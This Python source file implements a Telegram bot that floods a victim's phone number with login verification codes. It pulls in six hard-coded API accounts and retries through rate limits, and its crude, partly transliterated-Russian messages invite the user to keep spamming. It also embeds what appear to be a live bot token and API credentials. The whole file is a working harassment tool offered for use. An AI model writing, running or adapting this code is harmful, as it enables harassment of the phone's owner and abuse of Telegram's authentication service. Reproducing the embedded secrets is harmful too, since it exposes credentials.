import asyncio
import re
from telethon import TelegramClient, errors
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters

TOKEN = "8978420835:AAHBaPWP0IGX4YHw1qawpE7nCoRXaK4Kxc4"
ACCOUNTS = [
    {"api_id": 33788912, "api_hash": "175c63ac822b43d48b32776ee6b82761"},
    {"api_id": 33590106, "api_hash": "b40ac10586c1d243b6180c7f9a4feff2"},
    {"api_id": 39934985, "api_hash": "d0ff8b0d846856b0a01a99379b96e9bd"},
    {"api_id": 7216741, "api_hash": "1e85ff32d1cabb4e6e9537ae2d8218ca"},
    {"api_id": 31360840, "api_hash": "4279cc0d7ab41331200a13bf61152f4a"},
    {"api_id": 38299331, "api_hash": "fb5e560c3bda2db7541770b2294ee137"}
]

user_states = {}
clients = []

def init_clients():
    for acc in ACCOUNTS:
        client = TelegramClient(None, acc["api_id"], acc["api_hash"])
        client.start()
        clients.append(client)

def clean_phone(phone):
    phone = re.sub(r'[^0-9+]', '', phone)
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone

def send_codes_sync(chat_id, msg_id, phone):
    async def send_codes():
        log_msg = await bot.send_message(chat_id, "Отправка начата...")
        max_flood = 0
        status_lines = []

        async def send_one_client(client, idx):
            nonlocal max_flood
            sent = 0
            for attempt in range(6):
                while True:
                    try:
                        await client.send_code_request(phone)
                        sent += 1
                        break
                    except errors.FloodWaitError as e:
                        if e.seconds > max_flood:
                            max_flood = e.seconds
                        await asyncio.sleep(e.seconds)
                    except Exception:
                        break
            return f"Акк{idx}: {sent}/6"

        tasks = [send_one_client(client, i+1) for i, client in enumerate(clients)]
        results = await asyncio.gather(*tasks)
        await bot.edit_message_text("\n".join(results), chat_id, log_msg.message_id)
        await bot.edit_message_text("gotovo tvoia mat viebana", chat_id, msg_id)
        if max_flood > 0:
            remaining = max_flood
            while remaining > 0:
                await bot.edit_message_text(f"floodwait - {remaining}sekund", chat_id, msg_id)
                await asyncio.sleep(1)
                remaining -= 1
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("spam", callback_data="spam")]])
            await bot.edit_message_text("floodwait zakonchen mochesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
        else:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("spam", callback_data="spam")]])
            await bot.edit_message_text("floodwait zakonchen mochesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
        if chat_id in user_states:
            user_states[chat_id]["timer_task"] = None

    asyncio.run(send_codes())

def start(update, context):
    chat_id = update.message.chat_id
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("spam", callback_data="spam")]])
    sent = update.message.reply_text("privet ueban chtob spamit nashmi vnizu (spam)", reply_markup=kb)
    user_states[chat_id] = {"message_id": sent.message_id, "timer_task": None, "waiting_phone": False}

def spam_callback(update, context):
    query = update.callback_query
    query.answer()
    chat_id = query.message.chat_id
    state = user_states.get(chat_id)
    if not state:
        return
    if state.get("timer_task"):
        pass
    context.bot.edit_message_text("napishi nomer", chat_id, state["message_id"])
    state["waiting_phone"] = True

def handle_phone(update, context):
    chat_id = update.message.chat_id
    state = user_states.get(chat_id)
    if not state or not state.get("waiting_phone"):
        return
    phone = clean_phone(update.message.text)
    state["waiting_phone"] = False
    update.message.delete()
    send_codes_sync(chat_id, state["message_id"], phone)

def main():
    global bot
    updater = Updater(TOKEN, use_context=True)
    bot = updater.bot
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(spam_callback, pattern="spam"))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_phone))
    init_clients()
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
